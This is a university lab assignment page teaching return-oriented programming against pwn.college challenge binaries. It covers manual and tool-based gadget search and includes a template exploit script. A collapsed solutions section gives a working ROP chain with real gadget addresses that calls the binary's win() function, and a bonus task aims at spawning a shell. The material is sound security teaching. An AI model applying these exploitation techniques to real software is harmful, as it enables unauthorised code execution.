---
title: "Lab 2: Return Oriented Programming (ROP)"
weight: 2
draft: false
---

## Overview

{{< callout emoji="💡" >}}

The goal of this lab is to teach you the basics of return-oriented programming
a.k.a ROP. You should be familiar with buffer overflows and how to overwrite the
return address. Last week we covered shellcode on the stack, but this week it is
no longer executable. To get around this you will use the buffer overflow to
place the addresses of various ROP gadgets onto the stack. This is called a ROP
chain, because each gadget returns to the address of the next one.

You can use these ROP gadgets to call functions, mess with registers.

**Goals:**

- Understand how ROP chains work
- Learn how to find Gadgets
- Use ROP tools to develop a chain to call a function

**Estimated Time:** `45 Minutes`

{{< /callout >}}

## Instructions

## Outline

- Download programs
- Run `loose-link-easy` to understand what it does.
  - answer questions about the text
    - where is the win function?
  - ## Look for a gadget manuall
  - Install ROP tools
    - ROPGadget, r++

## Instructions

{{% steps %}}

### Get the Vulnerable Programs

For this lab, we've provided a couple of binaries pulled straight from the
excellent [pwn.college](https://pwn.college) ROP challenges. You will also need
the `libcapstone` library in order to run them.

{{< downloadbutton file="./libcapstone.so.5" text="libcapstone.so.5" >}}

{{< downloadbutton file="./loose-link-easy.bin" text="loose-link-easy.bin" >}}

> [!NOTE]
>
> If you feel lost on any of the ROP concepts, there are some great lectures
> explaining things on the
> [pwn.college website](https://pwn.college/program-security/return-oriented-programming/)

### Run the program

Run the `loose-link-easy` program to understand what the challenge is asking you
to do.

```sh {filename=Shell}
> export LD_PRELOAD="$PWD/libcapstone.so.5"
> ./loose-link-easy
# ...
```

> [!NOTE]
>
> It may not prompt you for input. I didn't have time to debug the issue but it
> seems to work in `gdb` so try that.

{{< question >}}

What is the address of the `win()` function?

{{< /question >}}

### Manual ROP gadget analysis

The intended solution to this challenge binary is to use the buffer overflow to
execute a ROP chain that calls the `win()` function. To do that, we'll need some
ROP gadgets. As covered in lecture, ROP gadgets are little bits of code found in
the program that execute a few assembly instructions and then return. If you
combine enough of these, you can execute some pretty complex functionality!

Lets start by trying to find our first gadget. I usually like to work backwards,
so we'll look for the last thing that needs to happen which is to call the win
function. Try looking for the simplest gadget that can achieve that:

```asm
call rax
ret
```

You can use an online assembler to find the bytes representing these
instructions which we can use to search later. Here are a couple:

- https://shell-storm.org/online/Online-Assembler-and-Disassembler
- https://defuse.ca/online-x86-assembler.htm

{{< question >}}

What are the bytes corresponding to the assembly instructions above? <br></br>
HINT: You should get three 2-digit pairs. (`c0 ff ee` for example)

{{< /question >}}

Next search for those bytes in the text section of the program using
binaryninja.

![](./binja_executable_sections.png "")

{{< question >}}

What would happen if we tried to use a ROP gadget from a non-executable segment
of the memory map?

{{< /question >}}

![](./binja_search_menu.png)

![](./binja_search_custom_range.png)

> [!TIP]
>
> Sometimes the ROP gadget you want, just isn't there. Try relaxing the criteria
> and search for just the first two bytes (corresponding to `call rax`).

{{< question >}}

What is the address of the `call rax` gadget?

{{< /question >}}

### Using automated ROP tooling

As you can imagine, manually searching for gadgets is pretty tedious. Thankfully
there are some helpful tools you can use to make the process much faster and
slightly easier! Here are some recommendations:

**`ROPGadget` (Python)**

- [Github Repo](https://github.com/JonathanSalwan/ROPgadget)

```sh {filename=Shell}
# Install:
> uv tool install ROPGadget

# Usage:
> ROPGadget --help
# ...
```

**`rp++` (C++)**

- [Github Repo](https://github.com/0vercl0k/rp)

```sh {filename=Shell}
# Install:
> curl -OL https://github.com/0vercl0k/rp/releases/download/v2.1.5/rp-lin-clang.zip
> unzip -d ~/.local/bin ./rp-lin-clang.zip

# Usage:
> rp-lin --help
# ...
```

The easiest way to use these tools to find all the gadgets and then filter to
specific instructions or registers using `grep` or `rg` (ripgrep).

```sh {filename=Shell}
# Search for `call` or `jmp` instructions
rp-lin -f loose-link-easy --colors | rg --colors='match:none' '(call|jmp)' | less -SR

# Search for `pop` instructions, then filter for lines containing `r12`
rp-lin -f loose-link-easy | rg 'pop' | rg 'r12' | less
```

### Build a ROP chain

The last thing left to do is actually build the ROP chain, and send it to the
program as input. Here is an example python solution script to get you started.
Good luck!

```python {filename=Python}
#!/usr/bin/env python3
import sys
import struct

def write_bytes(data: bytes):
    _ = sys.stdout.buffer.write(data)
    _ = sys.stdout.buffer.flush()


if __name__ == "__main__":
    # Gadget Addresses
    rop1 = 0xdeadbeef
    rop2 = 0x13371337
    rop3 = 0xc0ffee

    # Buffer Setup
    buffer = b"A" * 104 # Fill to first return address

    # Gadget 1
    buffer += struct.pack("<Q", rop1)
    buffer += b"B" * 8  # extra data

    buffer += struct.pack("<Q", rop2)
    buffer += b"C" * 8

    buffer += struct.pack("<Q", rop2)

    write_bytes(buffer)
```

{{< question >}}

Include the code for your script and a screenshot of the `win()` function output
in your lab write-up.

{{< /question >}}

### BONUS: ROP -> Shellcode

If you are looking for more, you can complete this challenge which is similar to
the homework assignment. The goal is to develop a ROP chain that executes
shellcode to spawn a shell. To do this you need to set up the argument
registers, set the syscall number in `rax` and then execute the `syscall`
instruction.

<!-- deno-fmt-ignore-start -->
{{< downloadbutton file="./stop-pop-and-rop-easy.bin" text="stop-pop-and-rop-easy.bin" >}}
<!-- deno-fmt-ignore-end -->

> [!TIP] Tips
>
> - `pop` gadgets are helpful for setting registers because you can directly
>   control the value that will be popped from the stack.
> - To set a register to 0, `xor <reg> <reg>` gadgets are great!

{{% /steps %}}

## Solutions

{{% details title="Click to reveal.." closed="true" %}}

### Manual Gadget Search

![](./call_rax_bytes.png "")

![](./binja_find_bytes.png "")

### `loose-link-easy` Solution

```python
#!/usr/bin/env python3

# Commands Used:
#
# rp-lin -f loose-link-easy --colors | rg --colors='match:none' '(call)' | less -SR
# rp-lin -f loose-link-easy --colors | rg --colors='match:none' '(rdi|rbx)' | less -SR

# Gadgets:
#
# 0x401512: pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret ; (1 found)
# 0x401eb3: pop rdi ; ret ; (1 found)
# 0x401e9a: call qword [rdi+rbx*8] ; (1 found)

import sys
import struct


def write_bytes(data: bytes):
    _ = sys.stdout.buffer.write(data)
    _ = sys.stdout.buffer.flush()


if __name__ == "__main__":
    # Gadget Addresses
    rop1 = 0x401512
    rop2 = 0x401EB3
    rop3 = 0x401E9A

    # Buffer Setup
    buffer = b"A" * 104

    # Gadget 1
    buffer += struct.pack("<Q", rop1)
    buffer += b"\x00" * 8  # rbx
    buffer += b"B" * 8  # r12
    buffer += b"B" * 8  # r13
    buffer += b"B" * 8  # rbp

    # Gadget 2
    buffer += struct.pack("<Q", rop2)
    buffer += struct.pack("<Q", 0x00007fffffffe058)  # rdi

    # Gadget 3
    buffer += struct.pack("<Q", rop3)
    buffer += struct.pack("<Q", 0x401ab0)

    write_bytes(buffer)
```

![](./gadget_1.png "")

![](./gadget_2.png "")

![](./gadget_3.png "")

![](./gadget_3_regs.png "")

![](./win_function.png "")

![](./win_function_output.png "")

### Bonus Program:

Left as an exercise to the reader.

{{% /details %}}

## Submission

{{< callout emoji="📝" >}}

Submit a markdown file with any code you wrote and the answers to questions to
[ELMS](https://umd.instructure.com/courses/1390353/assignments).

{{< /callout >}}
